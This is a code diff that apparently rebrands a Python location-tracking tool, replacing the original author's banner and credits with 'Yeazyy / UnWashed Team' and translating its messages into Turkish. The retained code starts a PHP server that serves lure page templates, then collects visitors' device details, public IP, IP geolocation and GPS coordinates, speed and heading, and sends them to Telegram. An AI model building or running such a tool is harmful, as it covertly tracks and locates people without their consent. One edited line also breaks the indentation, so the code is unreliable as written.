@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-VERSION = '1.3.1'
+VERSION = '1.0'
 
 R = '\033[31m'  # red
 G = '\033[32m'  # green
@@ -114,19 +114,20 @@ def banner():
 		comms_url = json_data['comms']
 
 	art = r'''
-                        __
-  ______  ____   ____  |  | __  ____ _______
- /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
- \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
-/____  > \___  >\___  >|__|_ \ \___  >|__|
-     \/      \/     \/      \/     \/'''
+__   __                         
+\ \ / /__  __ _ _____   _ _   _ 
+ \ V / _ \/ _` |_  / | | | | | |                
+  | |  __/ (_| |/ /| |_| | |_| |
+  |_|\___|\__,_/___|\__, |\__, |      {R}UnWashed Team ©
+                    |___/ |___/
 	utils.print(f'{G}{art}{W}\n')
-	utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
-	utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
-	utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
-	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
+	utils.print(f'{G}[>] {C}Yapımcı: {W}Yeazyy')
+	utils.print(f'{G} |---> {C}Discord: {W}yeazyythevaliant')
+	utils.print(f'{G} |---> {C}Team: {W}UnWashed Team')
+	utils.print(f'{G}[>] {C}Versiyon: {W}{VERSION}\n')
+	utils.print(f'{G}[>] {C}Github: {W}Yeazyyv2')
 
-
+ 
 def send_webhook(content, msg_type):
 	if webhook is not None:
 		if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
@@ -143,7 +144,7 @@ def send_telegram(content, msg_type):
 	if telegram is not None:
 		tmpsplit = telegram.split(':')
 		if len(tmpsplit) < 3:
-			utils.print(f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}')
+			utils.print(f'{R}[-] {C}Telegram API tokeni geçersiz! Format -> token:chatId{W}')
 			return
 		from telegram_api import tgram_sender
 		tgram_sender(msg_type, content, tmpsplit)
@@ -185,7 +186,7 @@ def template_select(site):
 		sys.exit()
 
 	print()
-	utils.print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
+        utils.print(f'{G}[+] {C}Yükleniyor {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
 
 	imp_file = templ_json['templates'][selected]['import_file']
 	importlib.import_module(f'template.{imp_file}')
@@ -202,8 +203,8 @@ def template_select(site):
 def server():
 	print()
 	port_free = False
-	utils.print(f'{G}[+] {C}Port : {W}{port}\n')
-	utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+	utils.print(f'{G}[+] {C}Port: {W}{port}\n')
+	utils.print(f'{G}[+] {C}PHP Sunucusu başlatılıyor...{W}', end='')
 	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
 
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -219,14 +220,14 @@ def server():
 				old_proc = psutil.Process(pid)
 				utils.print(f'{C}[ {R}✘{C} ]{W}')
 				utils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')
-				utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+				utils.print(f'{G}[+] {C}PHP Sunucusu başlatılıyor...{W}', end='')
 				try:
 					sleep(1)
 					if old_proc.status() != 'running':
 						old_proc.kill()
 					else:
 						utils.print(f'{C}[ {R}✘{C} ]{W}')
-						utils.print(f'{R}[-] {C}Unable to kill php server process, kill manually{W}')
+						utils.print(f'{R}[-] {C}PHP Sunucusu kaldırılamadı, Manual kaldırın{W}')
 						sys.exit()
 				except psutil.NoSuchProcess:
 					pass
@@ -299,15 +300,15 @@ def data_parser():
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
 		device_info = f'''{Y}[!] Device Information :{W}
 
-{G}[+] {C}OS         : {W}{var_os}
-{G}[+] {C}Platform   : {W}{var_platform}
-{G}[+] {C}CPU Cores  : {W}{var_cores}
-{G}[+] {C}RAM        : {W}{var_ram}
-{G}[+] {C}GPU Vendor : {W}{var_vendor}
-{G}[+] {C}GPU        : {W}{var_render}
-{G}[+] {C}Resolution : {W}{var_res}
-{G}[+] {C}Browser    : {W}{var_browser}
-{G}[+] {C}Public IP  : {W}{var_ip}
+{G}[+] {C}OS: {W}{var_os}
+{G}[+] {C}Işletim Sistemi: {W}{var_platform}
+{G}[+] {C}CPU Çekirdekleri: {W}{var_cores}
+{G}[+] {C}RAM: {W}{var_ram}
+{G}[+] {C}GPU Satıcısı: {W}{var_vendor}
+{G}[+] {C}GPU: {W}{var_render}
+{G}[+] {C}Çözünürlük: {W}{var_res}
+{G}[+] {C}Tarayıcı: {W}{var_browser}
+{G}[+] {C}Public IP Adresi: {W}{var_ip}
 '''
 		utils.print(device_info)
 		send_telegram(info_json, 'device_info')
@@ -332,12 +333,12 @@ def data_parser():
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
 				ip_info = f'''{Y}[!] IP Information :{W}
 
-{G}[+] {C}Continent : {W}{var_continent}
-{G}[+] {C}Country   : {W}{var_country}
-{G}[+] {C}Region    : {W}{var_region}
-{G}[+] {C}City      : {W}{var_city}
-{G}[+] {C}Org       : {W}{var_org}
-{G}[+] {C}ISP       : {W}{var_isp}
+{G}[+] {C}Kıta: {W}{var_continent}
+{G}[+] {C}Ülke: {W}{var_country}
+{G}[+] {C}Bölge: {W}{var_region}
+{G}[+] {C}Şehir: {W}{var_city}
+{G}[+] {C}Org: {W}{var_org}
+{G}[+] {C}ISP: {W}{var_isp}
 '''
 				utils.print(ip_info)
 				send_telegram(data, 'ip_info')
@@ -362,12 +363,14 @@ def data_parser():
 				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
 				loc_info = f'''{Y}[!] Location Information :{W}
 
-{G}[+] {C}Latitude  : {W}{var_lat}
-{G}[+] {C}Longitude : {W}{var_lon}
-{G}[+] {C}Accuracy  : {W}{var_acc}
-{G}[+] {C}Altitude  : {W}{var_alt}
-{G}[+] {C}Direction : {W}{var_dir}
-{G}[+] {C}Speed     : {W}{var_spd}
+{G}[+] {C}Enlem: {W}{var_lat}
+{G}[+] {C}Boylam: {W}{var_lon}
+{G}[+] {C}Kesinlik: {W}{var_acc}
+{G}[+] {C}Rakım: {W}{var_alt}
+{G}[+] {C}Yön: {W}{var_dir}
+{G}[+] {C}Hız: {W}{var_spd}
+
+   {R}Yeazyy {G}iyi kullanımlar diler...
 '''
 				utils.print(loc_info)
 				send_telegram(result_json, 'location')
